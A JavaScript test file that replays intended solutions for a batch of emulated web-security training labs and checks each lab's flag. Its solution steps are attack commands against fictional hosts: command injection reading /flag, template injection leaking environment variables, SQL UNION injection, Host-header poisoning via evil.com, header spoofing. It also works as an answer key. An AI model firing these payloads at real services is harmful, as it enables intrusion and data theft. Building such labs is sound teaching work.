import { describe, it, expect } from 'vitest'
import fs from 'node:fs'
import path from 'node:path'
import { createSession } from './session'

// End-to-end solvability check for the web labs batch B5.
// Loads the REAL fixture bundles from content/labs, replays the intended
// solution with the emulated tools, and asserts `check` passes.
const dir = path.resolve(process.cwd(), '../content/labs')
const WD = '/home/student/task'
const CHECK = "grep -q 'nto{' found.txt"

function load(id) {
  return JSON.parse(fs.readFileSync(path.join(dir, `${id}.json`), 'utf8'))
}

const LABS = [
  {
    id: 'web-injection-basics', flag: 'nto{0s_c0mm4nd_1nj3ct10n_p1ngs_b4ck}', hints: 4,
    solution: [
      `curl -s 'https://shop.local/tools/ping?host=shop.local'`,
      `curl -s 'https://shop.local/tools/ping?host=127.0.0.1%3Bid'`,
      `curl -s 'https://shop.local/tools/ping?host=127.0.0.1%3Bcat%20/flag' > found.txt`,
    ],
  },
  {
    id: 'web-client-side-template-injection', flag: 'nto{cst1_4ngul4rjs_t3mpl4t3_t0_rce}', hints: 4,
    solution: [
      `curl -s 'https://crm.example/render?q=hello'`,
      `curl -s 'https://crm.example/render?q=%7B%7B7*7%7D%7D'`,
      `curl -s 'https://crm.example/render?q=%7B%7Bconstructor.constructor(%27return%20process.env.FLAG%27)()%7D%7D' > found.txt`,
    ],
  },
  {
    id: 'web-api-rest-graphql-soap', flag: 'nto{gr4phql_1ntr0sp3ct10n_l34ks_th3_sch3m4}', hints: 4,
    solution: [
      `curl -s https://api.shop.local/`,
      `curl -s https://api.shop.local/swagger`,
      `curl -s -X POST https://api.shop.local/graphql -H 'Content-Type: application/json' --data-binary @introspection.json`,
      `curl -s -X POST https://api.shop.local/graphql -H 'Content-Type: application/json' --data-binary @secret.json > found.txt`,
    ],
  },
  {
    id: 'web-subdomain-takeover-deep', flag: 'nto{ns_d3l3g4t10n_t4k3s_th3_wh0l3_z0n3}', hints: 4,
    solution: [
      `dig +short NS internal.target.com`,
      `dig +short MX target.com`,
      `dig +short TXT _acme-challenge.internal.target.com > found.txt`,
    ],
  },
  {
    id: 'web-race-single-packet', flag: 'nto{s1ngl3_p4ck3t_4tt4ck_w1ns_th3_r4c3}', hints: 4,
    solution: [
      `curl -s -X POST https://vote.local/vote -b 'session=me' -d 'candidate=7'`,
      `cat turbo.py`,
      `python3 turbo.py > found.txt`,
    ],
  },
  {
    id: 'web-waf-parsing-attacks', flag: 'nto{h0st_h34d3r_1nj3ct10n_c4ptur3s_th3_t0k3n}', hints: 4,
    solution: [
      `curl -s -d 'email=alice@shop.local' https://shop.local/password/reset`,
      `curl -s -d 'email=alice@shop.local' https://shop.local/password/reset -H 'Host: evil.com'`,
      `curl -s -d 'email=admin@shop.local' https://shop.local/password/reset -H 'Host: attacker.tld' > found.txt`,
    ],
  },
  {
    id: 'web-waf-evasion-basics', flag: 'nto{v3rb_t4mp3r1ng_byp4ss3s_th3_w4f}', hints: 4,
    solution: [
      `curl -s 'https://shop.local/api/products?id=1%20UNION%20SELECT%20pass%20FROM%20users'`,
      `curl -s -X PATCH 'https://shop.local/api/products?id=1%20UNION%20SELECT%201,password,3%20FROM%20users' > found.txt`,
    ],
  },
  {
    id: 'web-websocket', flag: 'nto{w3bs0ck3t_trusts_x_f0rw4rd3d_us3r}', hints: 4,
    solution: [
      `websocat ws://t/ws`,
      `websocat -H 'X-Forwarded-User: admin' ws://t/ws > found.txt`,
    ],
  },
  {
    id: 'web-tool-httpie', flag: 'nto{httpi3_m4k3s_4p1_r3c0n_3ff0rtl3ss}', hints: 4,
    solution: [
      `http GET https://api.example/v1/item?id=1`,
      `http GET https://api.example/v1/flag 'X-API-Key:shp_live_9f3c2a' > found.txt`,
    ],
  },
]

describe.each(LABS)('web lab B5: $id', ({ id, flag, hints, solution }) => {
  const bundle = load(id)
  const spec = { kind: 'shell', workdir: WD, check: CHECK, hints: Array(hints).fill('h') }

  it('bundle + seed files are consistent with the lesson lab block', () => {
    expect(bundle.id).toBe(id)
    expect(bundle.workdir).toBe(WD)
    expect(bundle.fs.some((f) => f.path === `${WD}/task.md`)).toBe(true)
    expect(bundle.expect.file).toBe(`${WD}/found.txt`)
    expect(bundle.expect.contains).toBe(flag)
  })

  it('replays the intended solution and passes check', async () => {
    const s = createSession({ spec, bundle })
    expect((await s.run('check')).code).toBe(1)
    for (const cmd of solution) await s.run(cmd)
    expect((await s.run('check')).code).toBe(0)
  })
})
